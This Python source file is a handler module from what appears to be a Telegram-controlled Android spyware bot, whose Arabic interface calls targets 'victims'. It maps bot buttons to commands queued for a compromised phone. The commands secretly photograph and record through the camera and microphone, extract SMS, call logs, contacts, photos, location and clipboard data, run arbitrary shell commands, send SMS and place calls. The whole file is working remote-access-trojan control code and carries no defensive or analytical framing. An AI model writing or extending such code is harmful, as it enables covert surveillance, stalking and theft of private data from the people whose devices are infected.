# bot_handlers/callbacks/victim_commands.py
from config import bot
from imports_manager import get_victim, queue_victim_command
from logging_config import get_logger

logger = get_logger("bot_handlers.callbacks.victim_commands")


# ★ خريطة الأوامر
ACTION_MAP = {
    "camfront": "camera_front",
    "camback": "camera_back",
    "videofront": "camera_record_front",
    "videoback": "camera_record_back",
    "video": "camera_record",
    "audio": "record_audio",
    "sound": "play_sound",
    "alarm": "play_alarm",
    "info": "get_device_info",
    "battery": "get_battery",
    "sms": "get_sms",
    "calls": "get_call_log",
    "contacts": "get_contacts",
    "apps": "get_apps",
    "photos": "get_photos",
    "videos": "get_videos",
    "location": "get_location",
    "wifi": "get_wifi_info",
    "clipboard": "get_clipboard",
    "vibrate": "vibrate",
    "volmax": "volume_max",
    "lock": "lock_screen",
    "home": "show_home",
    "screenoff": "screen_off",
    "mediaplay": "media_play_pause",
    "medianext": "media_next",
    "mediaprev": "media_previous",
}


def handle(call, chat_id, user_id, data):
    body = data.replace("vcmd_", "")
    parts = body.split("_")
    victim_id = parts[-1]
    action = "_".join(parts[:-1])

    victim = get_victim(chat_id, victim_id)
    if not victim:
        bot.answer_callback_query(call.id, "❌ ضحية غير موجودة", show_alert=True)
        return

    # ─── مستوى صوت ───
    if action == "volmute":
        ok = queue_victim_command(victim_id, "volume_set", level=0, stream="music")
        bot.answer_callback_query(call.id, "🔉 تم خفض الصوت" if ok else "❌ فشل",
                                  show_alert=not ok)
        return

    if action == "volmid":
        ok = queue_victim_command(victim_id, "volume_set", level=8, stream="music")
        bot.answer_callback_query(call.id, "🔉 تم ضبط الصوت" if ok else "❌ فشل",
                                  show_alert=not ok)
        return

    # ─── أوامر بسيطة ───
    if action in ACTION_MAP:
        real_action = ACTION_MAP[action]
        kwargs = {}
        if action in ("video", "videofront", "videoback"):
            kwargs["duration"] = 10000
        elif action == "audio":
            kwargs["duration"] = 10000
        elif action == "vibrate":
            kwargs["ms"] = 3000

        ok = queue_victim_command(victim_id, real_action, **kwargs)
        bot.answer_callback_query(call.id,
                                  "✅ تم الإرسال" if ok else "❌ فشل",
                                  show_alert=not ok)
        return

    # ─── أوامر تفاعلية ───
    if action in ("toast", "shell", "sendsms", "call", "url"):
        bot.answer_callback_query(call.id)
        prompt_map = {
            "toast": "💬 <b>أرسل النص:</b>",
            "shell": "💻 <b>أرسل الأمر:</b>",
            "sendsms": "✉️ <b>أرسل:</b> <code>رقم|نص</code>",
            "call": "📞 <b>أرسل الرقم:</b>",
            "url": "🌐 <b>أرسل الرابط:</b>",
        }
        msg = bot.send_message(chat_id, prompt_map[action], parse_mode="HTML")

        from ..steps.victim_steps import (
            v_toast_step, v_shell_step, v_sendsms_step,
            v_call_step, v_url_step,
        )
        step_map = {
            "toast": v_toast_step,
            "shell": v_shell_step,
            "sendsms": v_sendsms_step,
            "call": v_call_step,
            "url": v_url_step,
        }
        step_fn = step_map[action]
        bot.register_next_step_handler(msg, lambda m: step_fn(m, victim_id))
        return

    bot.answer_callback_query(call.id, f"❓ {action}", show_alert=True)
